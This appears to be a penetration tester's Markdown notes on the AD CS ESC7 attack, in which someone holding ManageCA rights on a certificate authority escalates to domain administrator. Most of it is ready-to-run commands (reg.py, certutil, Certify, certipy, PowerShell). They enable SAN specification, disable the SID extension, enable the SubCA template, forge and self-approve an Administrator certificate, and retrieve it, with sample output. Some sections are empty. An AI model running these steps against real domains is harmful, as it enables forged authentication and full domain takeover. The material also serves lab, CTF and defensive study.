## Overview

- If you have `ManageCA` over CA (ESC7) you can enable `ESC6` + `ESC16` because you have permissions to configure the CA.
-  Since we have `ManageCA` rights, we can assign `ManageCertificate` rights to any account.

ESC7 addresses vulnerabilities arising from an attacker obtaining highly privileged permissions directly on a CA object within AD CS or on the CA service itself. These permissions grant significant control over the CA's operations and security. The two primary permissions of concern are:
- **`Manage CA` (CA Administrator/ManageCa):** This permission grants extensive control over the CA, including the ability to modify its configuration (e.g., which certificate templates are published), assign CA roles (including Certificate Manager/Officer, if needed), start/stop the CA service, and manage CA security. **This is the core permission that ESC7 often revolves around.** So we can remotely manipulate the `EDITF_ATTRIBUTESUBJECTALTNAME2` bit to enable SAN (Subject Alternative Name) specification in any template (refer to ESC6).
- **`Manage Certificates` (Certificate Manager/Officer):** This permission allows a user to approve or deny pending certificate requests and to revoke issued certificates, bypassing the protection of `CA certificate manager approval`


---
## Enumeration
### Linux
#### certipy
```shell
ManageCa                        : LAB.LOCAL\Black Wasp                                 
								  LAB.LOCAL\James
								  LAB.LOCAL\user_manageCA 
```
### windows


---
## Abuse
There are 2 methods that could be used to exploit ESC7:
- Set`EDITF_ATTRIBUTESUBJECTALTNAME2` bit to enable SAN (`ESC6`) and disable SID (`ESC16`).
- Abusing the default `SubCA` certificate template. This template, intended for issuing certificates to subordinate CAs, allows enrollee-supplied subjects and has very broad EKUs.

### First Method: ESC6 + ESC16

> [!Danger] 
> In order for `ESC6` + `ESC16` to work, you should restart the ADCS service.
#### Linux
```sh
# Step 1: Enable EDITF_ATTRIBUTESUBJECTALTNAME2 (EditFlags - REG_DWORD)
reg.py 'DOMAIN/USER:PASS'@CA-HOST query -keyName 'HKLM\SYSTEM\CurrentControlSet\Services\CertSvc\Configuration\<CA-NAME>\PolicyModules\CertificateAuthority_MicrosoftDefault.Policy' -v EditFlags

reg.py 'DOMAIN/USER:PASS'@CA-HOST add -keyName 'HKLM\SYSTEM\CurrentControlSet\Services\CertSvc\Configuration\<CA-NAME>\PolicyModules\CertificateAuthority_MicrosoftDefault.Policy' -v EditFlags -vt REG_DWORD -vd 0x413c8c


# Step 2: Append SID OID to DisableExtensionList (REG_MULTI_SZ)
reg.py 'DOMAIN/USER:PASS'@CA-HOST query -keyName 'HKLM\SYSTEM\CurrentControlSet\Services\CertSvc\Configuration\<CA-NAME>' -v DisableExtensionList
reg.py 'DOMAIN/USER:PASS'@CA-HOST add -keyName 'HKLM\SYSTEM\CurrentControlSet\Services\CertSvc\Configuration\<CA-NAME>' -v DisableExtensionList -vt REG_MULTI_SZ -vd '1.3.6.1.4.1.311.21.1 1.3.6.1.4.1.311.21.2 1.3.6.1.4.1.311.25.2'

# !!!!! But you need to figure out how to restart the service. if you can't restart it then you can't exploit it.
```

#### Windows
Certify
```powershell
# 1. Enable UPN tampering using --esc6, disable SID interaction using esc16 "This may need permissions over CA"
.\Certify.exe manage-ca --ca FRIES.HTB\fries-DC01-CA --esc6 --esc16

# you may need to restart the ADCS service
Stop-Service certsvc -force
Start-Service certsvc

# 2. Request certificate with tampered UPN
.\Certify request --ca FRIES.HTB\fries-DC01-CA --tempate user --upn administrator
```

manual
```powershell
# 1. Enable SAN
certutil -config "CA-COMPUTER-NAME\CA-NAME" -getreg policy\EditFlags # Query the remote CA for the current 'EditFlags' value
certutil -config "CA-COMPUTER-NAME\CA-NAME" -setreg policy\EditFlags +EDITF_ATTRIBUTESUBJECTALTNAME2 # +EDITF... adds the flag. (-EDITF... would remove it) 

# 2. Disable SID
# Check the 'DisableExtensions' registry key on the CA
# If the SID OID (1.3.6.1.4.1.311.25.2) is NOT listed here, it is ENABLED (which is bad for the attacker).
certutil -config "CA-NAME\CA-SERVER" -getreg policy\DisableExtensions
certutil -config "CA-NAME\CA-SERVER" -setreg policy\DisableExtensions +1.3.6.1.4.1.311.25.2 # The OID of SID Extension is 1.3.6.1.4.1.311.25.2,We APPEND (+) this OID to the DisableExtensions list

# 3. Restart ADCS service
Stop-Service certsvc -force
Start-Service certsvc

______ or ______
#### Query EDITF_ATTRIBUTESUBJECTALTNAME2
$ConfigReader = New-Object SysadminsLV.PKI.Dcom.Implementations.CertSrvRegManagerD "LAB-DC"
$ConfigReader.SetRootNode($true)
$ConfigReader.GetConfigEntry("EditFlags","PolicyModules\CertificateAuthority_MicrosoftDefault.Policy")
#### Disable EDITF_ATTRIBUTESUBJECTALTNAME2
$ConfigReader.SetConfigEntry(1114446,"EditFlags","PolicyModules\CertificateAuthority_MicrosoftDefault.Policy")
$ConfigReader.GetConfigEntry("EditFlags","PolicyModules\CertificateAuthority_MicrosoftDefault.Policy")
#### Enable EDITF_ATTRIBUTESUBJECTALTNAME2
$ConfigReader.SetConfigEntry(1376590,"EditFlags","PolicyModules\CertificateAuthority_MicrosoftDefault.Policy")
$ConfigReader.GetConfigEntry("EditFlags","PolicyModules\CertificateAuthority_MicrosoftDefault.Policy")
# if we want to allow `blwasp` to have `ManageCertificates` rights, we can use the following PowerShell command:
Get-CertificationAuthority LAB-DC.LAB.LOCAL | Get-CertificationAuthorityAcl  | Add-CertificationAuthorityAcl -Identity "blwasp" -AccessType Allow -AccessMask "ManageCertificates" |  Set-CertificationAuthorityAcl -RestartCA # this  will need elevated privileges

#### Request a certificate with a template that requires approval
.\Certify.exe request /ca:LAB-DC\lab-LAB-DC-CA /template:ESC7_1 /altname:Administrator


#### Enumerate Pending Requests
Get-CertificationAuthority -ComputerName LAB-DC.lab.local | Get-PendingRequest

#### Approve pending request with PowerShell
Get-CertificationAuthority -ComputerName LAB-DC.lab.local | Get-PendingRequest -RequestID 100 | Approve-CertificateRequest

#### Download Pending Request
.\Certify.exe download /ca:LAB-DC\lab-LAB-DC-CA /id:100

```

### Second Method: SubCA certificate
The `SubCA` template is notable because it can be used for any purpose and allows the enrollee to specify the subject name, so its vulnerable to `ESC1` by default. Typically, only administrators can enroll for this template. If not already enabled on the CA, a user with `Manage CA` rights can enable it. The attacker then attempts to request a certificate using `SubCA`, specifying the UPN and SID of a target privileged user (e.g., Administrator). If the attacker lacks direct enrollment rights on `SubCA`, this initial request will be denied but will generate a request ID. The private key associated with this CSR must be saved by the attacker. Leveraging their `Manage CA` capabilities (which includes the ability to manage roles and requests, effectively encompassing officer functions), the attacker can then ensure this request is approved and subsequently retrieve the certificate.
#### Linux
```sh
# 1. add account to officer `Manager Certificates`
certipy ca -u 'BlWasp@lab.local' -p 'Password123!' -ca lab-LAB-DC-CA -add-officer BlWasp

# 2. Ensure the `SubCA` template is enabled on the CA.
certipy ca -u 'attacker@corp.local' -p 'Passw0rd!' -ns '10.0.0.100' -target 'CA.CORP.LOCAL' -ca 'CORP-CA' -enable-template 'SubCA'

# 3. Request SubCA certificate as UPN of administrator (expected to fail initially if no direct enrollment rights)
certipy req -u 'BlWasp@lab.local' -p 'Password123!' -ca lab-LAB-DC-CA -template SubCA -upn Administrator

# 4. Approve the pending request
certipy ca -u 'BlWasp@lab.local' -p 'Password123!' -ca lab-LAB-DC-CA -issue-request 31

# 5. Retrieve the issued certificate
certipy req -u 'BlWasp@lab.local' -p 'Password123!' -ca lab-LAB-DC-CA -retrieve 31
[*] Rerieving certificate with ID 31
[*] Successfully retrieved certificate
[*] Got certificate with UPN 'Administrator'
[*] Certificate has no object SID
[*] Loaded private key from '31.key'
[*] Saved certificate and private key to 'administrator.pfx'
```

#### windows
```

```